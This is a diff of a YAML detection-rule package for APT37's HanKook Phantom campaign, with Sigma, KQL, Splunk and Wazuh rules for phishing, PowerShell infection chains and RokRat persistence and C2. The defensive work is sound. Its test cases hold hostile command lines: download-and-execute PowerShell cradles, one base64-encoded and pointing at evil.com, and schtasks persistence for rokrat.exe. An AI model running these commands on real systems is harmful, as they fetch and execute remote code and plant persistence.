@@ -1,17 +1,19 @@
 apiVersion: soac.io/v1
 kind: DetectionRule
 metadata:
-  name: APT37 Operation HanKook Phantom Defense Detection
-  version: 1.0.0
-  author: SOaC Detection Engineering Team
-  created: 2024-01-15
-  package_id: pkg-015
-  mitre_attack:
+  name: apt37-hankook-phantom-defense
+  created: "2026-03-20T00:00:00Z"
+  author: "SOaC Detection Engineering Team"
+  package_id: "pkg-015"
+  description: >
+    Detection rules for APT37 (Famous Chollima) Operation HanKook Phantom campaign.
+    Covers spear-phishing with HWP/LNK decoy documents, PowerShell infection chains,
+    RokRat backdoor deployment, and cloud-based C2 exfiltration via Dropbox/Yandex/pCloud.
+  mitre_techniques:
     - T1566.001
     - T1566.002
-    - T1204.002
     - T1059.001
-    - T1105
+    - T1204.002
     - T1053.005
     - T1112
     - T1219
@@ -20,156 +22,191 @@ metadata:
     - T1573.001
     - T1005
     - T1041
-  severity: high
-  data_sources:
-    - endpoint_logs
-    - process_creation
-    - file_creation
-    - network_traffic
-    - registry_events
-    - cloud_storage_logs
+    - T1105
+  severity: CRITICAL
+  confidence: HIGH
+  threat_actor: APT37 (Famous Chollima)
+  campaign: Operation HanKook Phantom
+  version: "1.0.0"
+
 spec:
-  description: Detects APT37 (Famous Chollima) Operation HanKook Phantom Defense attack chain including spear-phishing, LNK file execution, PowerShell infection chain, RokRat backdoor deployment, cloud C2 communication, and data exfiltration
-  platforms:
-    - windows
-    - cloud
-  inline_rules:
-    - id: apt37-spearphish-lnk-execution
-      name: APT37 Spear-phishing LNK File Execution
-      format: kql
-      platform: windows
-      mitre:
-        - T1566.001
-        - T1566.002
-        - T1204.002
-      severity: high
-      query: |
-        DeviceProcessEvents
-        | where Timestamp > ago(24h)
-        | where ProcessCommandLine contains ".lnk"
-        | where ProcessCommandLine has_any("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe")
-        | where ProcessCommandLine has_any("/c", "-c", "-ep bypass", "-w hidden")
-        | where ParentProcessName in~ ("explorer.exe", "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
-        | where ProcessCommandLine has_any("http", "https", "ftp", "download", "invoke", "iex")
-        | project Timestamp, DeviceName, ProcessCommandLine, ParentProcessName, InitiatingProcessFileName
-    - id: apt37-powershell-infection-chain
-      name: APT37 PowerShell Infection Chain
-      format: sigma
-      platform: windows
-      mitre:
-        - T1059.001
-        - T1105
-      severity: high
-      query: |
-        title: APT37 PowerShell Infection Chain
-        logsource:
-          category: process_creation
-          product: windows
-        detection:
-          selection1:
-            Image|endswith: '\powershell.exe'
-            CommandLine|contains:
-              - 'DownloadString'
-              - 'DownloadFile'
-              - 'WebClient'
-              - 'Invoke-Expression'
-              - 'IEX'
-          selection2:
-            CommandLine|contains:
-              - 'bypass'
-              - 'hidden'
-              - 'noprofile'
-              - 'noninteractive'
-          selection3:
-            CommandLine|contains:
-              - 'cloud'
-              - 'storage'
-              - 'dropbox'
-              - 'onedrive'
-              - 'googledrive'
-          condition: selection1 and selection2 and selection3
-    - id: apt37-rokrat-persistence
-      name: APT37 RokRat Backdoor Persistence
-      format: splunk
-      platform: windows
-      mitre:
-        - T1053.005
-        - T1112
-        - T1219
-      severity: critical
-      query: |
-        (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1)
-        OR (source="WinEventLog:Security" EventCode=4688)
-        | where (CommandLine="*schtasks*" AND CommandLine="*/create*" AND CommandLine="*powershell*")
-        OR (CommandLine="*reg*" AND CommandLine="*add*" AND CommandLine="*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*")
-        OR (Image="*\\svchost.exe" AND ParentImage!="*\\services.exe")
-        | eval suspicious_persistence=if(match(CommandLine, "(?i)(schtasks.*create.*powershell|reg.*add.*run)"), "high", "medium")
-        | where suspicious_persistence="high"
-        | table _time, Computer, Image, CommandLine, ParentImage, suspicious_persistence
-    - id: apt37-cloud-c2-communication
-      name: APT37 Cloud-based C2 Communication
-      format: wazuh
-      platform: windows
-      mitre:
-        - T1071.001
-        - T1567.002
-        - T1573.001
-      severity: high
-      query: |
-        <rule id="100001" level="12">
-          <if_group>sysmon_event1</if_group>
-          <field name="win.eventdata.commandLine" type="pcre2">(?i)(dropbox|onedrive|googledrive|mega\.nz|pcloud)</field>
-          <field name="win.eventdata.commandLine" type="pcre2">(?i)(upload|download|sync|api)</field>
-          <field name="win.eventdata.parentImage" type="pcre2">(?i)(powershell\.exe|cmd\.exe|rundll32\.exe)</field>
-          <description>APT37 Cloud-based C2 Communication Detected</description>
-          <mitre>
-            <id>T1071.001</id>
-            <id>T1567.002</id>
-            <id>T1573.001</id>
-          </mitre>
-        </rule>
-    - id: apt37-data-exfiltration
-      name: APT37 Data Collection and Exfiltration
-      format: kql
-      platform: windows
-      mitre:
-        - T1005
-        - T1041
-        - T1567.002
-      severity: high
-      query: |
-        DeviceFileEvents
-        | where Timestamp > ago(24h)
-        | where ActionType in ("FileCreated", "FileModified")
-        | where FileName has_any(".zip", ".rar", ".7z", ".tar", ".gz")
-        | where FolderPath has_any("temp", "appdata", "programdata")
-        | join kind=inner (
+  description: >
+    Multi-stage detection correlating spear-phishing delivery of HWP/LNK files,
+    PowerShell-based payload execution, RokRat backdoor installation with persistence
+    mechanisms, and cloud-based C2 communication via Dropbox/Yandex/pCloud.
+  rules:
+    - id: APT37-ROKRAT-001
+      name: "APT37 Spear-Phishing Decoy Document Delivery"
+      description: "Detects delivery of malicious HWP, LNK, or PDF files matching APT37 campaign patterns"
+      platforms:
+        sigma: |
+          title: APT37 Spear-Phishing Decoy Document
+          status: experimental
+          logsource:
+            category: email
+            product: exchange
+          detection:
+            selection:
+              Attachment|endswith:
+                - '.hwp'
+                - '.lnk'
+              Subject|contains:
+                - 'National Intelligence'
+                - 'Research Society'
+                - 'Newsletter'
+                - 'North Korea'
+                - 'Security Forum'
+            condition: selection
+          level: critical
+          tags:
+            - attack.initial_access
+            - attack.t1566.001
+        sentinel: |
+          EmailEvents
+          | where Timestamp > ago(24h)
+          | where AttachmentFileType in ("hwp", "lnk", "pdf")
+          | where Subject has_any ("National Intelligence", "Research Society", "Newsletter", "Security Forum")
+          | extend RiskScore = case(
+              AttachmentFileType == "lnk", 95,
+              AttachmentFileType == "hwp", 90,
+              80
+          )
+          | where RiskScore >= 80
+          | project Timestamp, SenderFromAddress, RecipientEmailAddress, Subject, AttachmentFileName, RiskScore
+        splunk: |
+          index=email sourcetype=exchange:messagetracking
+          | where match(attachment_name, "\.(hwp|lnk)$")
+          | where match(subject, "(National Intelligence|Research Society|Newsletter|Security Forum)")
+          | eval risk_score=case(
+              match(attachment_name, "\.lnk$"), 95,
+              match(attachment_name, "\.hwp$"), 90,
+              1==1, 80
+          )
+          | where risk_score >= 80
+          | table _time, sender, recipient, subject, attachment_name, risk_score
+        wazuh:
+          rule_id: 101501
+          level: 14
+          description: "APT37 spear-phishing decoy document detected"
+
+    - id: APT37-ROKRAT-002
+      name: "PowerShell Infection Chain Execution"
+      description: "Detects PowerShell-based infection chain used to deploy RokRat backdoor"
+      platforms:
+        sigma: |
+          title: APT37 PowerShell Infection Chain
+          status: experimental
+          logsource:
+            category: process_creation
+            product: windows
+          detection:
+            selection:
+              ParentImage|endswith:
+                - '\cmd.exe'
+                - '\explorer.exe'
+              Image|endswith: '\powershell.exe'
+              CommandLine|contains:
+                - '-enc'
+                - 'IEX'
+                - 'Invoke-Expression'
+                - 'DownloadString'
+                - 'Net.WebClient'
+            condition: selection
+          level: critical
+          tags:
+            - attack.execution
+            - attack.t1059.001
+        sentinel: |
+          DeviceProcessEvents
+          | where Timestamp > ago(1h)
+          | where FileName =~ "powershell.exe"
+          | where ProcessCommandLine has_any ("-enc", "IEX", "Invoke-Expression", "DownloadString", "Net.WebClient")
+          | where InitiatingProcessFileName in~ ("cmd.exe", "explorer.exe", "mshta.exe")
+          | extend RiskScore = 95
+          | project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
+        splunk: |
+          index=endpoint sourcetype=sysmon EventCode=1
+          | where process_name="powershell.exe"
+          | where match(process, "(\\-enc|IEX|Invoke-Expression|DownloadString|Net\\.WebClient)")
+          | where match(parent_process_name, "(cmd\\.exe|explorer\\.exe|mshta\\.exe)")
+          | eval risk_score=95
+          | table _time, host, user, process, parent_process_name, risk_score
+        wazuh:
+          rule_id: 101502
+          level: 14
+          description: "APT37 PowerShell infection chain detected"
+
+    - id: APT37-ROKRAT-003
+      name: "RokRat Backdoor Persistence and C2 Communication"
+      description: "Detects RokRat persistence via scheduled tasks and C2 over cloud services"
+      platforms:
+        sigma: |
+          title: RokRat Backdoor Cloud C2 Communication
+          status: experimental
+          logsource:
+            category: proxy
+            product: firewall
+          detection:
+            selection_c2:
+              dst|contains:
+                - 'api.dropboxapi.com'
+                - 'cloud-api.yandex.net'
+                - 'api.pcloud.com'
+            selection_persistence:
+              EventType: ScheduledTaskCreation
+              TaskName|contains:
+                - 'OneDrive'
+                - 'WindowsUpdate'
+            condition: selection_c2 or selection_persistence
+          level: critical
+          tags:
+            - attack.command_and_control
+            - attack.t1071.001
+            - attack.persistence
+            - attack.t1053.005
+        sentinel: |
+          let CloudC2 = dynamic(["api.dropboxapi.com", "cloud-api.yandex.net", "api.pcloud.com"]);
+          union
+          (
             DeviceNetworkEvents
-            | where Timestamp > ago(24h)
-            | where RemoteUrl has_any("dropbox", "onedrive", "googledrive", "mega.nz", "pcloud")
-            | where ActionType == "ConnectionSuccess"
-        ) on DeviceId
-        | where abs(datetime_diff('minute', Timestamp, Timestamp1)) <= 30
-        | project Timestamp, DeviceName, FileName, FolderPath, RemoteUrl, InitiatingProcessFileName
+            | where Timestamp > ago(1h)
+            | where RemoteUrl has_any (CloudC2)
+            | extend DetectionType = "C2_Communication"
+          ),
+          (
+            DeviceProcessEvents
+            | where Timestamp > ago(1h)
+            | where FileName =~ "schtasks.exe"
+            | where ProcessCommandLine has_any ("OneDrive", "WindowsUpdate", "/create")
+            | extend DetectionType = "Persistence"
+          )
+          | extend RiskScore = 90
+          | project Timestamp, DeviceName, DetectionType, RemoteUrl, ProcessCommandLine
+        splunk: |
+          index=proxy OR index=endpoint
+          | multisearch
+            [search index=proxy dest_host IN ("api.dropboxapi.com", "cloud-api.yandex.net", "api.pcloud.com")
+            | eval detection_type="C2_Communication"]
+            [search index=endpoint sourcetype=sysmon EventCode=1 process_name="schtasks.exe"
+            | where match(process, "(OneDrive|WindowsUpdate|/create)")
+            | eval detection_type="Persistence"]
+          | eval risk_score=90
+          | table _time, host, detection_type, dest_host, process, risk_score
+        wazuh:
+          rule_id: 101503
+          level: 14
+          description: "RokRat backdoor persistence or cloud C2 detected"
+
   test_cases:
-    - name: APT37 LNK File Execution Test
-      description: Simulates execution of malicious LNK file leading to PowerShell command execution
-      input:
-        process_name: cmd.exe
-        command_line: 'cmd.exe /c powershell.exe -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''https://malicious-domain.com/payload.ps1'')"'
-        parent_process: explorer.exe
-      expected_result: Detection triggered for spear-phishing LNK execution
-    - name: APT37 RokRat Persistence Test
-      description: Simulates RokRat backdoor establishing persistence via scheduled task
-      input:
-        process_name: schtasks.exe
-        command_line: 'schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden -c IEX(Get-Content C:\temp\update.ps1)" /sc daily'
-        parent_process: powershell.exe
-      expected_result: Detection triggered for suspicious persistence mechanism
-    - name: APT37 Cloud C2 Communication Test
-      description: Simulates cloud-based C2 communication via legitimate cloud services
-      input:
-        process_name: powershell.exe
-        command_line: 'powershell.exe -c "Invoke-WebRequest -Uri https://api.dropboxapi.com/2/files/upload -Method POST"'
-        network_connection: api.dropboxapi.com:443
-      expected_result: Detection triggered for cloud-based C2 activity
+    - name: "APT37 HWP decoy document delivery test"
+      description: "Simulates spear-phishing email with HWP attachment"
+      expected_detections: ["APT37-ROKRAT-001"]
+      command_line: "Send-MailMessage -Subject 'National Intelligence Research Society Newsletter' -Attachments 'report.hwp'"
+    - name: "PowerShell infection chain execution test"
+      description: "Simulates PowerShell-based payload download and execution"
+      expected_detections: ["APT37-ROKRAT-002"]
+      command_line: "powershell.exe -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApACkA"
+    - name: "RokRat cloud C2 and persistence test"
+      description: "Simulates RokRat C2 beacon to cloud services and scheduled task creation"
+      expected_detections: ["APT37-ROKRAT-003"]
+      command_line: "curl https://api.dropboxapi.com/2/files/upload && schtasks /create /tn OneDriveSync /tr C:\\Users\\Public\\rokrat.exe /sc hourly"
